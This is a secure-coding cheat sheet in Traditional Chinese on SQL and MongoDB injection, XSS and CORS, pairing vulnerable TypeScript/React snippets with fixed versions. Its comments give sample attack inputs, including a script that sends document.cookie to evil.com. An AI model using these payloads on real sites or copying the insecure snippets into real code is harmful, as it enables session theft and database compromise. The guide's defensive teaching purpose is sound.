# 常見安全風險速查

## SQL Injection

使用 parameterized query，禁止字串拼接。

```ts
// ❌ 危險：直接拼接使用者輸入
const query = `SELECT * FROM users WHERE email = '${email}'`
// 攻擊者輸入：' OR '1'='1

// ✅ Parameterized query
const user = await db.query(
  'SELECT * FROM users WHERE email = $1',
  [email]
)

// ✅ ORM（Prisma 自動處理）
const user = await prisma.user.findUnique({ where: { email } })
```

NoSQL 也有注入風險（MongoDB）：

```ts
// ❌ MongoDB Injection
db.users.find({ username: req.body.username })
// 攻擊者傳入：{ "$gt": "" }

// ✅ 型別驗證後再查詢
const { username } = z.object({ username: z.string() }).parse(req.body)
db.users.find({ username })
```

## XSS

區分 `textContent`（安全）與 `innerHTML`（危險）。

```ts
// ❌ XSS 漏洞：直接插入 HTML
element.innerHTML = userInput
// 攻擊者輸入：<script>fetch('evil.com?c='+document.cookie)</script>

// ✅ 純文字，不解析 HTML
element.textContent = userInput

// ✅ 必須插入 HTML 時，用 DOMPurify sanitize
import DOMPurify from 'dompurify'
element.innerHTML = DOMPurify.sanitize(userInput)
```

React 的 JSX 預設 escape，但 `dangerouslySetInnerHTML` 等同 innerHTML：

```tsx
// ❌ React XSS
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// ✅
<div>{userInput}</div>
// 或
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
```

## CORS 設定

使用白名單模式，禁止 `*`（萬用字元）用於含身分驗證的 API。

```ts
// ❌ 危險：允許所有來源
app.use(cors({ origin: '*' }))

// ✅ 白名單模式
const allowedOrigins = [
  'https://app.example.com',
  'https://admin.example.com',
]

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true)
    } else {
      callback(new Error('Not allowed by CORS'))
    }
  },
  credentials: true,  // 允許攜帶 cookie
}))
```

`credentials: true` 時 `origin` 不能是 `*`，瀏覽器會直接 block。
